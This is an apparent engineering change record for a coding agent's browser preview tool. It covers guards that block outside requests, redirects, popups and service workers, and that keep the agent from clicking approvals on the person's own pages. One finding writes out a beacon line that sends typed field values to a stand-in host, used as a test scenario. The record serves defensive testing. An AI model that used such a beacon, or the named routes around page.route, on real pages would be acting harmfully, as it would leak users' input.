title: The agent uses the preview: clicks and typing, behind a guard on every request and window
request: The owner's goal: Claude Code's capabilities; the UI review's next item: the agent can see the preview but not act in it. The owner approved reinstalling Playwright's Chromium for the page tests.
plan: a preview.act tool: click, fill, press, wait, then the picture and text
local pages only, never the person's own pages
the page tests run on Playwright's Chromium or, without it, the machine's Chrome

decisions.decision: block every request to another site, images, fonts and scripts included
decisions.why: anything the agent types could otherwise leave in a beacon; the cost is a picture without remote assets, said in the tool's text

decisions.decision: refuse the person's own ports (DCLab Code, DCLab's server, 4317, 8765, 8777) for every request, not only the first address
decisions.why: approvals and settings on those pages are the person's; a click there by the agent would be a person's decision made by a model

decisions.decision: route on the browser context, block service workers, check each redirect before following it, close new windows
decisions.why: page.route misses popups, redirects after the first URL and service-worker requests (Playwright's docs)

decisions.decision: fall back to the installed Google Chrome (fresh profile) when Playwright's Chromium is missing
decisions.why: a cleanup had deleted Chromium and 19 page tests were silently skipped; Chrome was already on the machine

change: dclab-code server/browser.js (new), server/preview_tool.js (act, allowed(), context-wide guard), server/engine.js (DCLab's port refused), tests/page.test.js, tests/units.test.js, web/index.html (icon).

findings.defect: the agent could click on the person's own pages
findings.scenario: act on http://127.0.0.1:8765/ or a local app that redirects or links to DCLab Code's port, then click Approve
findings.cause: only the first URL was checked, and only against this app's own port
findings.fix: allowed() refuses the person's ports for every request, link and redirect
findings.test: page test: a link and a redirect to the own port; the Approve click fails; mutation (ports ignored) fails the test

findings.defect: a redirect to another site was followed
findings.scenario: a local page answers 302 to a remote host: its picture and text came back
findings.cause: page.route sees only the first URL of a redirect chain
findings.fix: route.fetch with maxRedirects 0; the Location is checked before the browser follows it
findings.test: page test with a stand-in remote that must get zero requests; mutation fails the test

findings.cause: page.route does not cover new pages
findings.fix: context-wide routes; any new window is closed and said
findings.test: page test; mutation fails the test

findings.defect: typed text could leave in an image beacon or fetch
findings.scenario: fill a field, click: new Image().src='https://x/?d='+value
findings.fix: every request to another site is not sent; service workers blocked; the count is said
findings.test: page test: the remote stand-in receives nothing

findings.defect: a page that keeps leaving was shown as the browser's error page
findings.scenario: a meta refresh to a remote host
findings.cause: the fallback reload ran the refresh again
findings.fix: go back once; if still away, say so with no picture

findings.defect: after a blocked link, Chrome showed its own error page in place of the app
findings.scenario: a link to example.com clicked in a local app
findings.cause: Chrome commits an error page for an aborted navigation; Playwright's Chromium did not
findings.fix: go back to the local page

findings.defect: the page test file hung for ten minutes after a failure
findings.scenario: an assertion failed before the test's servers were closed

findings.defect: real Chrome logged a 404 for the page's icon
findings.test: the first page test (no console errors)

measurements.name: tests
measurements.result: dclab-code 113 of 113; page tests 20 of 20 on Playwright's Chromium, also passing on Google Chrome

measurements.name: mutations
measurements.gate: the guard test fails when the guard is broken
measurements.result: own ports ignored, redirects unchecked, popups kept: each fails the test

outcome: The agent can use a local app it builds, as the person does in the Preview tab, and can never act on the person's own pages or send anything to another site.
lessons: A tool that only looks and a tool that clicks need different guards: give the clicking one the guards of the person's own clicks.
Check a guard test by breaking the guard; a test that passes on broken code proves nothing.
Playwright's page.route misses redirects, popups and service workers; route the context.
risks: no live session has used preview.act with a model yet
Playwright's Chromium takes 573 MB, more than the 150 MB said to the owner
